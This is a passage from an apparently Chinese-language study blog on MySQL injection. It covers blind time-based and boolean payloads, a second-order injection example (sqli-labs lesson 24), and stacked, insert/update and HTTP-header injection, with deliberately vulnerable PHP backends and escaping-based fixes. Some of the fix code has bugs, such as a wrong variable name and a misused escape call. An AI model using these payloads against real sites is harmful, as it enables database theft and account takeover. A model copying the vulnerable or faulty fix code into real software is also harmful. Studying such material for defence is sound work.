class="line">			这就是比较正常的使用方法（我没说上面的不正常啊）</span><br><span class="line">ascii()</span><br><span class="line">	ascii()的作用为返回相应字符的ASCII编码，如果输入字符串或一串数字则会按第一个字符来进行返回相应的ASCII编码</span><br><span class="line">	select ascii(1) -&gt; 49</span><br><span class="line">	select ascii(&apos;a&apos;) -&gt; 97</span><br><span class="line">	一个单独的ascii()函数确实没什么大意思，但与上面的stbstr()、if(),sleep()来套组合拳，那就很厉害了</span><br><span class="line">		ascii(substr(String,Num_Start,1))</span><br><span class="line">			利用substr来截取字符串的每一个字符来传递给ascii，ascii()函数呢再最终输出该字符的ascii编码</span><br><span class="line">		if(ascii(substr(String,Num_Start,1))=Num,sleep(N),1)</span><br><span class="line">			利用if来将ascii()函数返回的ascii编码进行判断（猜测）,如果猜测数据正好等于返回的ascii编码,那么			 程序就进行延时N秒。</span><br><span class="line">			利用sleep()这个特性呢，就可以进行fuzz测试获取真实数据以达到注入目的</span><br><span class="line">length()</span><br><span class="line">	length(String) 返回字符串长度</span><br><span class="line">		如：select length(database()); 返回当前数据库名长度</span><br><span class="line">	与ascii()函数一样，不打组合拳没什么威力</span><br><span class="line">		if(length(String)=Num,条件1,条件2)</span><br><span class="line">			在进行substr获取数据库、表、字段名之前，如果知道他们各自的字符串长度，在进行爆破名的过程中效率会			   高跟多</span><br></pre></td></tr></table></figure>

<h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#获取当前数据库名长度</span><br><span class="line">and if(length(database())=Num,sleep(3),1)</span><br><span class="line">#获取所有数据库名长度</span><br><span class="line">and if(length((select group_concat(schema_name) from information_schema.schemata))=Num,sleep(3),1)</span><br><span class="line">#获取当前数据库名</span><br><span class="line">and if(ascii(substr(database(),N,1)=Num,sleep(3),1) N的大小由数据库名长度决定,Num的范围是 1~127 汉字除外</span><br><span class="line"></span><br><span class="line">上面已经说了具体获取数据库库名和长度的方法，表、字段等相关信息不再复述</span><br></pre></td></tr></table></figure>



<h3 id="Bool注入"><a href="#Bool注入" class="headerlink" title="Bool注入"></a>Bool注入</h3><h4 id="什么是Bool注入"><a href="#什么是Bool注入" class="headerlink" title="什么是Bool注入"></a>什么是Bool注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造特定的sql语句</span><br><span class="line">	当条件成立时网页返回正常（and 1=1）</span><br><span class="line">	当条件不成立时网页出现错误（and 1=2）</span><br><span class="line"></span><br><span class="line">Bool注入使用的环境</span><br><span class="line">	1、正常注入流程无法使网页回显有效数据库信息</span><br><span class="line">	2、当构造的sql语句条件不成立时会返回与正常页面不同的信息（不成立的依据）</span><br></pre></td></tr></table></figure>

<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    error_reporting(<span class="number">0</span>); <span class="comment">//程序不报错</span></span><br><span class="line"></span><br><span class="line">    $con = mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'****'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from admin where id =$id limit 1"</span>;</span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($con,$sql);</span><br><span class="line"></span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line"></span><br><span class="line"><span class="comment">#重点</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">'username'</span>]; <span class="comment">//条件正确，网页返回正常数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>; <span class="comment">//条件错误，网页返回error</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="涉及到的sql函数及利用"><a href="#涉及到的sql函数及利用" class="headerlink" title="涉及到的sql函数及利用"></a>涉及到的sql函数及利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与延时注入相似，大多是将延时注入里面中的sleep()替换为1，与之相对的替换为0</span><br><span class="line">	为什么替换为1、0：</span><br><span class="line">		1在编程语言代表True</span><br><span class="line">		0在变成序言中代表False</span><br><span class="line">常用到的函数：</span><br><span class="line">	if()、ascii()、length()、substr()</span><br><span class="line">	上述函数已经在延时注入里面介绍过了，这里不再造车轮</span><br><span class="line"></span><br><span class="line">利用Bool注入获取数据库信息：</span><br><span class="line">	注入环境：</span><br><span class="line">		and 1=1 返回正常</span><br><span class="line">		and 1=2 返回错误</span><br><span class="line">	获取当前数据库名长度：</span><br><span class="line">		and 1=if(length(database())=Num,1,0)</span><br><span class="line">			遍历Num 当条件成立时页面返回正常</span><br><span class="line">	获取当前数据库名：</span><br><span class="line">		and 1=if(ascii(substr(database(),Num,1))=Num2,1,0)</span><br><span class="line">			Num:截取database()第几个字符</span><br><span class="line">			遍历Num2获取该字符的ascii编码进行解码即可</span><br><span class="line">	</span><br><span class="line">	剩下的表长度、表名、字段长度、字段名、字段信息都是通过这种方法获取的，方法，原理都是一样。不再复述</span><br></pre></td></tr></table></figure>

<p><strong>简单的防注入：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    $con = mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'****'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">   	$id = mysqli_escape_string($id);	<span class="comment">//防注入</span></span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from admin where id ='$id' limit 1"</span>; <span class="comment">//注意这里进行了单引号闭合,这两点一起才能防注入</span></span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($con,$sql);</span><br><span class="line"></span><br><span class="line">    $row = mysqli_fetch_array($res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    这种简单的防注入不仅仅是应用在Bool注入，延时注入，二次注入，联合注入等注入攻击基本上都可以防御</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br></pre></td></tr></table></figure>



<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击者构造的恶意数据存储到数据库中，导致每次特定操作可引发恶意代码的执行。</span><br><span class="line">上述两个过程即为二次注入</span><br><span class="line">	1、将恶意数据（代码）插入到数据库中</span><br><span class="line">	2、攻击者特定行为使恶意代码从服务器中执行</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93%5C%E6%B3%A8%E5%85%A5%5Cmysql%5C%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%5C1.png" srcset="undefined" alt></p>
<h4 id="二次注入的利用"><a href="#二次注入的利用" class="headerlink" title="二次注入的利用"></a>二次注入的利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二次注入不像上面的延时注入、Bool注入、联合注入花样那么多，而且二次注入根据不同的环境也会存在不同的注入方法。</span><br><span class="line"></span><br><span class="line">在这里就以实战的形式来进行表达(sqllab 24题)</span><br></pre></td></tr></table></figure>

<p><strong>登陆界面</strong>：</p>
<p><img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/%E6%B3%A8%E5%85%A5/mysql/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/login.png" srcset="undefined" alt></p>
<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"></span><br><span class="line">username password 都用了mysql_real_escape_string函数将敏感字符进行过滤，所以登录界面不存在什么注入</span><br></pre></td></tr></table></figure>

<h5 id="PHP-mysql-real-escape-string-函数防SQL注入"><a href="#PHP-mysql-real-escape-string-函数防SQL注入" class="headerlink" title="PHP mysql_real_escape_string() 函数防SQL注入"></a><a href="https://www.cnblogs.com/jukan/p/5348398.html" target="_blank" rel="noopener">PHP mysql_real_escape_string() 函数防SQL注入</a></h5><p>注册用户功能：</p>
<p><img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/%E6%B3%A8%E5%85%A5/mysql/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/reg.png" srcset="undefined" alt></p>
<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $username=  mysql_escape_string($_POST[<span class="string">'username'</span>]);  <span class="comment">//将敏感字符过滤</span></span><br><span class="line">    $pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);  <span class="comment">//将敏感字符过滤</span></span><br><span class="line">    $re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);  <span class="comment">//将敏感字符过滤</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font size='3' color='#FFFF00'&gt;"</span>;</span><br><span class="line">    $sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">    $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print_r($row);</span></span><br><span class="line">    <span class="keyword">if</span> (!$row[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;script&gt;alert(<span class="string">"The username Already exists, Please choose a different username "</span>)&lt;/script&gt;;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        header(<span class="string">'refresh:1, url=new_user.php'</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass==$re_pass)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                $sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">                mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">              ··················</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造</span><br><span class="line">	Username: admin&apos;# 从后端源码可以看出 需要进行单引号闭合</span><br><span class="line">	password = admin</span><br></pre></td></tr></table></figure>

<p>登录后进行密码修改</p>
<p><img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/%E6%B3%A8%E5%85%A5/mysql/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/upd.png" srcset="undefined" alt></p>
<p>无论当前密码是什么，都可以修改成功</p>
<p><img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/%E6%B3%A8%E5%85%A5/mysql/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/succ.png" srcset="undefined" alt="image-20191105204537626"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">能修改成功的原因：</span><br><span class="line">	username：admin&apos;#</span><br><span class="line">	在进行修改密码的过程中用到了下面的sql语句：</span><br><span class="line">		$sql = update table_name set password=new_password where username=admin&apos;# and curr_password=*</span><br><span class="line">		可以看到 # 将后面password的验证注释掉了。所以无论原密码是什么,都可以成功将密码修改</span><br></pre></td></tr></table></figure>

<h5 id="一道关于二次注入的CTF"><a href="#一道关于二次注入的CTF" class="headerlink" title="一道关于二次注入的CTF"></a><a href="https://blog.csdn.net/qq_30123355/article/details/58161312" target="_blank" rel="noopener">一道关于二次注入的CTF</a></h5><h5 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">暂且能想到的办法是对用户输入的特殊字符进行过滤</span><br></pre></td></tr></table></figure>

<h5 id="搁置的问题"><a href="#搁置的问题" class="headerlink" title="搁置的问题"></a><strong>搁置的问题</strong></h5><ul>
<li>二次注入没有实现的代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输入数据代码（insert）</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    name &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    passwd &lt;input type=<span class="string">"password"</span> name=<span class="string">"passwd"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">'submit'</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">"****"</span>,<span class="string">'testt'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'testt'</span>,$con);</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$name = mysql_escape_string($name);</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$passwd = mysql_escape_string($passwd);</span><br><span class="line"><span class="comment">// $name = mysql_real_escape_string($name);</span></span><br><span class="line"><span class="comment">// $sql = "insert into test(id,user,passwd) values(NULL,\"$name\",\"$passwd\");";</span></span><br><span class="line"><span class="comment">// $res = mysql_query($sql,$con);</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into test ( user, passwd) values(\"$name\", \"$passwd\")"</span>;</span><br><span class="line">mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//更新数据代码 不知道哪出了问题，没有办法实现二次注入</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    name &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line"> 	oldpasswd &lt;input type=<span class="string">"password"</span> name=<span class="string">"odpass"</span>&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    passwd &lt;input type=<span class="string">"password"</span> name=<span class="string">"passwd"</span>&gt;</span><br><span class="line">	&lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">'submit'</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">"****"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'testt'</span>,$con);</span><br><span class="line"></span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$passwd = mysql_real_escape_string($passwd);</span><br><span class="line">$odpass = $_POST[<span class="string">'odpass'</span>];</span><br><span class="line">$odpass = mysql_real_escape_string($odpass);</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"UPDATE test SET passwd='$passwd' where user='$name' and passwd='$odpass'; "</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">$row = mysql_affected_rows();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="什么是堆叠注入"><a href="#什么是堆叠注入" class="headerlink" title="什么是堆叠注入"></a><strong>什么是堆叠注入</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">平常我们注入时都是通过对原来sql语句传输数据的地方进行相关修改，注入情况会因为该语句本身的情况而受到相关限制。但堆叠注入的一条sql语句中存在多条功能不同的sql语句，其中每条不同功能的sql语句以 ; 结束。在特定情况下可以依次执行拼接好的sql语句。这样就突破了仅能对数据进行操作的限制，堆叠注入可以进行sql中所有的操作</span><br></pre></td></tr></table></figure>

<h4 id="堆叠注入使用的条件"><a href="#堆叠注入使用的条件" class="headerlink" title="堆叠注入使用的条件"></a><strong>堆叠注入使用的条件</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行。</span><br></pre></td></tr></table></figure>

<p>后端代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'****'</span>,<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test where id=$id;"</span>;</span><br><span class="line"></span><br><span class="line">mysqli_multi_query($con,$sql); <span class="comment">//支持执行多条sql语句</span></span><br><span class="line"></span><br><span class="line">$res = mysqli_store_result($con); <span class="comment">//上一条sql语句执行结果储存在 mysqli_store_result（）。结果空返回NULL</span></span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_array($res);<span class="comment">//返回形式类似于python中的字典只不过php有自己的数组输出方式</span></span><br><span class="line"></span><br><span class="line">var_dump($row);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string"> 正常情况下，程序是不会回显第一条sql语句分号后面的内容，但分号后面的sql语句会在数据库中正常执行</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 修复堆叠注入很简单，在其他条件不会触发sql注入的情况下将mysqli_multi_query() 替换为 mysqli_query()</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br></pre></td></tr></table></figure>



<h3 id="Insert、update注入"><a href="#Insert、update注入" class="headerlink" title="Insert、update注入"></a><strong>Insert、update注入</strong></h3><h4 id="什么是Insert、update注入"><a href="#什么是Insert、update注入" class="headerlink" title="什么是Insert、update注入"></a><strong>什么是Insert、update注入</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在数据库中处理或更新字段信息时会用到其中的insert（插入新字段数据）、update（更新字段数据）函数来对数据进行修改。</span><br><span class="line">因为对数据库进行交互，后端代码没有进行严格的过滤或存在其他安全问题。当新的字段数据可控时，可能会导致sql注入等系列安全问题</span><br></pre></td></tr></table></figure>

<h4 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,base64_decode(<span class="string">'UnF5OTkxMjIzLSs='</span>),<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">@$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">@$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into test values(NULL,'$name','$passwd')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#'''上面是insert注入'''</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"update test set passwd='$passwd' where user='$name'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#'''这里是update注入'''</span></span><br><span class="line"></span><br><span class="line">mysqli_query($con,$sql);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如果后端代码对可控信息参数进行引号闭合，可以用下面转义的方法进行防御</span></span><br><span class="line">@$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$name = addslashes($name);</span><br><span class="line">@$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$passwd = addslashes($passwd);</span><br><span class="line"><span class="comment">#如果后端代码没有对可控信息参数进行引号闭合，可采用特殊字符过滤的方法进行防御</span></span><br></pre></td></tr></table></figure>

<h4 id="留下的问题"><a href="#留下的问题" class="headerlink" title="留下的问题"></a>留下的问题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么上面的程序可以用and sleep(3) or&apos; 进行注入</span><br><span class="line">下面header头注入却要用 or sleep(3) or&apos; 来进行注入</span><br></pre></td></tr></table></figure>

<h4 id="解决上面出现的问题"><a href="#解决上面出现的问题" class="headerlink" title="解决上面出现的问题"></a>解决上面出现的问题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在解决问题之前，先了解一下 and、or 执行原理及mysql中处理字符串的原理</span><br><span class="line">	and：</span><br><span class="line">		当 and 前的条件为True时，and后面的（sql函数或sql语句）才执行</span><br><span class="line">		select 1 and sleep(2) #执行（ 1 代表True，&gt;1 完全成立）</span><br><span class="line">		select 0 and sleep(2) #不执行（ 0 代表False）</span><br><span class="line">	</span><br><span class="line">	or：</span><br><span class="line">		当 or 前面的条件为False时，or 后面的（sql函数或sql语句）才执行</span><br><span class="line">		select 0 or sleep(2) # 执行</span><br><span class="line">		select 1 or sleep(2) # 不执行</span><br><span class="line">	</span><br><span class="line">	在mysql中当字符串与数字进行比较时，如果字符串中的第一个字符是0-9任意数字，则在比较过程中会用第一个数字与其	 进行比较，如果第一个字符是非整型则默认为0</span><br><span class="line">		select &quot;1a&quot;=1; =&gt; 1</span><br><span class="line">		select &quot;a&quot;=a; =&gt; 0</span><br><span class="line"></span><br><span class="line">#insert、update后端与数据库交互的部分代码</span><br><span class="line">$sql = &quot;insert into test values(NULL,&apos;$name&apos;,&apos;$passwd&apos;)&quot;;</span><br><span class="line">	当 $name 被传入的值为 123 时 可用 and 来进行触发延时注入（123&gt;1 = True）</span><br><span class="line">	当 $name 被传入的值为 &quot;asd&quot; 时 可用 or 来进行触发延时注入(&quot;asd&quot;= 0 =False)</span><br><span class="line">所以这就很好解释HTTP头注入大多用 or 而不用 and</span><br><span class="line">	HTTP头获取的数据大多为字符型数据且第一个字符为非整型数据，所以要用or不用and。</span><br><span class="line">		如果host 存放的数据为 1.1.1.1 那 就要用 and 来触发 延时注入</span><br></pre></td></tr></table></figure>



<h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h4 id="什么是HTTP-头注入"><a href="#什么是HTTP-头注入" class="headerlink" title="什么是HTTP{头注入"></a>什么是HTTP{头注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先来看一段正常的请求包</span><br><span class="line"></span><br><span class="line">GET /test.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: values=admin</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">上面全部的都为请求包的Head部分，因为User-Agent（反爬虫）、Host（不明白的东西不能说）、Cookie（判断用户）这三个头所包含的数据存在特殊用处，所以有些网站会将他们及其对应的数据内容存放到数据库中，如果后端代码没有处理完善，进而导致sql注入</span><br><span class="line"></span><br><span class="line">因为Head头注入里面牵扯到的原理是一样的，所以我就用同一个后端代码来进行概括了</span><br></pre></td></tr></table></figure>

<h4 id="后端代码-1"><a href="#后端代码-1" class="headerlink" title="后端代码"></a>后端代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,base64_decode(<span class="string">'UnF5OTkxMjIzLSs='</span>),<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"values"</span>,<span class="string">"admin"</span>); <span class="comment">//设置一个cookie 键值、键名</span></span><br><span class="line"></span><br><span class="line">$cookie = $_COOKIE[<span class="string">'values'</span>]; <span class="comment">// 获取请求中的Cookie信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"COOKIE:"</span>.$cookie.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$xff = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>); <span class="comment">// 获取XFF请求的数据信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xff;</span><br><span class="line"></span><br><span class="line">$UA = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]; <span class="comment">//获取请求中的User-Agent</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $UA.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$host = $_SERVER[<span class="string">"HTTP_HOST"</span>]; <span class="comment">// 获取请求中的Host</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $host.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into db values('$cookie','$host','$UA')"</span>;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,$sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cookie = $_COOKIE[<span class="string">'values'</span>]; <span class="comment">// 获取请求中的Cookie信息</span></span><br><span class="line"></span><br><span class="line">$cookie = addslashes($cookie);<span class="comment">//将数据内容进行转义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$UA = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]; <span class="comment">//获取请求中的User-Agent</span></span><br><span class="line"></span><br><span class="line">$UA = addslashes($UA);<span class="comment">//将数据内容进行转义</span></span><br><span class="line"></span><br><span class="line">$xff = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>); <span class="comment">//获取请求中的XFF</span></span><br><span class="line"></span><br><span class="line">$xff = addslashes($xss) <span class="comment">//将数据内容进行转义</span></span><br><span class="line"></span><br><span class="line">$host = $_SERVER[<span 